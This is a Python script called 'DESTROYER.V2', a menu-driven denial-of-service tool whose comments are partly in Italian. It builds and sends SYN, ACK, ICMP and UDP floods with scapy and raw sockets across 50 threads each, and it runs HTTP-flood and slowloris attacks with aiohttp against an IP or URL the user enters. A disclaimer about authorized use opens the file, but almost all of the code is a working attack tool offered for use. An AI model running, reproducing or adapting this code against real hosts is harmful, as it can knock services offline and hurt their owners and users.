#!/usr/bin/python3
import aiohttp
import socket
import asyncio
import threading
from scapy.all import IP  , TCP , send , ICMP
import time
import sys
from rich.console import Console# red -> error , bold red -> fatal error , blue -> neutral , green -> success
import os
import pyfiglet
from functools import wraps
def avvertences():
    console=Console()
    console.input('''[bold yellow]\t⚠DISCLAIMER\t

This tool is intended solely for authorized, controlled, and ethical use. Any improper or unauthorized use may lead to serious technical, legal, or operational consequences. The creator of this tool assumes no responsibility for any actions performed with it, nor for any damage, disruption, or misuse resulting from its execution.
Users are fully responsible for ensuring that:

    the tool is used only in environments where explicit permission has been granted,

    all operations comply with applicable laws and regulations,

    the target IP address is correct and intentionally specified.

If the IP address is incorrect, malformed, or unreachable, the tool may send requests to non‑existent or unintended hosts, as it does not validate or absorb responses. It is the user’s responsibility to verify all parameters before running the tool.
By using this software, you acknowledge that you are solely accountable for your actions and any consequences that may arise from them.
\t<<Press Enter to continue to the tool...>>[/bold yellow]
''')
def timer(funzione):
    @wraps(funzione)
    def wrapper(*args , **kwargs):
        console=Console()
        inizio=time.time()
        risultato=funzione(*args , **kwargs)
        fine=time.time()
        tempo=fine - inizio
        console.print(f'[green][+]Completed in {tempo} sec[/green]')
        return risultato
    return wrapper
class Dos:
    console=Console() 
    def __init__(self ,  ip, dport , num):
        self.ip=ip
        self.dport=dport
        self.num=num
    def syn_flood(self):
        pkt=IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='S')
        for i in range(int(self.num)):
            send(pkt , verbose=0)
    def ack_flood(self):
        pkt=IP(dst=str(self.ip))/TCP(dport=self.dport ,flags='A')
        for i in range(int(self.num)):
            send(pkt , verbose=0)
    def ping_flood(self):
        pkt=IP(dst=str(self.ip))/ICMP(type=8) / b"Py_Test" *12
        for i in range(int(self.num)):
            send(pkt , verbose=0)
    def UDP_spamming(self):
        if True:#idk
            message= b"bhxod/0x/b1/nwo/18n/obx1" *12   
            try:
                sock=socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
                sock.setblocking(False)
                for i in range(int(self.num)):
                    sock.sendto(message, (self.ip , self.dport))
            except BlockingIOError:
                time.sleep(3)
                pass
            except Exception as e: 
                self.console.print(f'[bold red][-]Unknown error: {e}[/bold red]')
            finally:
                sock.close()
    async def http_flood(self , session):
        url=str(self.ip)
        async with session.get(url)as session:
            return
    async def slowloris(self):#The slowloris attack is a DoS(Denial of service) attack that tries to keep alive for a long time some connections for using all server resources
        self.console.print('[blue][*]Starting SlowLoris...[/blue]')
        async with aiohttp.ClientSession() as session:
            url=str(self.ip)
            tasks=[]
            for i in range(int(self.num)):
                conn=session.post(url , data='\r\n')
                tasks.append(conn)
            self.console.print('[green][+]Keeping the connections open for 10 minutes![/green]')
            await asyncio.gather(*tasks)
            await asyncio.sleep(600)#It manteins the connection open for 10 minutes
            self.console.print('[green][+]End.[/green]')
    @timer
    def run_syn_flood(self):
        processi=[]
        for i in range(50):
            a=threading.Thread(target=self.syn_flood)        
            processi.append(a)
            a.start()
        for i in processi:
            i.join()
    @timer
    def run_ack_flood(self):
        process=[]
        for i in range(50):
            t=threading.Thread(target=self.ack_flood)
            process.append(t)
            t.start()
        for i in process:
            i.join()
    @timer
    def run_ping_flood(self):
        process=[]
        for i in range(50):
            t=threading.Thread(target=self.ping_flood)
            process.append(t)
            t.start()
        for i in process:
            i.join()
    @timer
    def run_UDP_spamming(self):
        process=[]
        for i in range(50):
            t=threading.Thread(target=self.UDP_spamming)
            process.append(t)
            t.start()
        for i in process:
            i.join()
    async def run_http_flood(self):
        async with aiohttp.ClientSession() as session:
            tasks=[self.http_flood(session) for _ in range(int(self.num))]
            await asyncio.gather(*tasks)
async def main():
    console=Console()
    avvertences()
    try:
        if os.name=='nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    BANNER=pyfiglet.figlet_format('DESTROYER.V2' , font='standard')
    console.print(f'[green]{BANNER}[/green]')
    a=str(input('''\n
Select an option:
[1]SYN TCP flood
[2]ACK TCP flood
[3]Ping flood
[4]UDP DoS
[5]Http_flood
[6]SlowLoris\n
Select(Ctrl + c for exit)>>'''))
    try:
        if int(a) > 6 or int(a)< 1:
            console.print('[red][-]Inexistent option[/red]')
            sys.exit(0)
    except ValueError:
        console.print('[red][-]Inexistent option[/red]')
        sys.exit(0)
    ip=str(input('Enter a target ip:'))
    try:
        if ip[0:4]=='http' or ip[0:5] == 'https':
            pass
        else:
            socket.inet_aton(ip)#Guarda se un IPv4 è valido o no socket.inet_pton(ip) per IPv6
    except OSError:
        console.print('[red][-]Invalid IP[/red]')
        sys.exit(0)
    try:
        porta=int(input('Enter a target port:'))     
        richieste=int(input('Enter a number of requests:'))
    except ValueError:
        sys.exit('Insert a number')
    try:
        if a=='1':
            console.print('[blue][*]Starting SYN flood[/blue]')
            dos=Dos(ip, porta, richieste)
            dos.run_syn_flood()
            console.print('[green][+]End.[/green]')
        elif a=='2':
            console.print('[blue][*]Starting ACK flood[/blue]')
            dos=Dos(ip, porta, richieste)
            dos.run_ack_flood()
            console.print('[green][+]End.[/green]')
        elif a=='3':
            console.print('[blue][*]Starting ping flood[/blue]')
            dos=Dos(ip, porta, richieste)  
            dos.run_ping_flood()
            console.print('[green][+]End.[/green]')
        elif a=='4':
            console.print('[blue][*]Starting UDP DoS[/blue]')
            dos=Dos(ip, porta, richieste)  
            dos.run_UDP_spamming()
            console.print('[green][+]End.[/green]')
    except Exception as e:
        console.print(f'[red][-]Unknown error:{e}[red]')
        sys.exit(0)
    if a=='5':
        try:
            console.print('[blue][+]Starting http_flood[/blue]')
            inizio=time.time()        
            dos=Dos(ip, porta, richieste)
            await dos.run_http_flood()
            fine=time.time()
            tempo=fine - inizio
            console.print(f'[green][+]End in {tempo}seconds[/green]')
        except aiohttp.InvalidURL as e:#Verifica se l'url è invalido
            console.print('[bold red][-]Invalid URL , before the ip/domain put http:// or https://(it depends for the site)[/bold red]')
        except:
            pass
    elif a=='6':
        try:
            dos=Dos(ip, porta, richieste)  
            await dos.slowloris()
        except aiohttp.InvalidURL as e:#Verifica se l'url è invalido
            console.print('[bold red][-]Invalid URL , before the ip/domain put http:// or https://(it depends for the site)[/bold red]')
        except:
            pass
    else:
        pass
    try:
        porta=int(porta)
        if not(1 <= porta <= 65535):
            raise ValueError    
    except ValueError:
        print('[-]Invalid port')
        sys.exit(1)
if __name__=='__main__':
    if os.geteuid()!=0:
        sys.exit('Run as administrator')
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit('\nQuitting...\n')

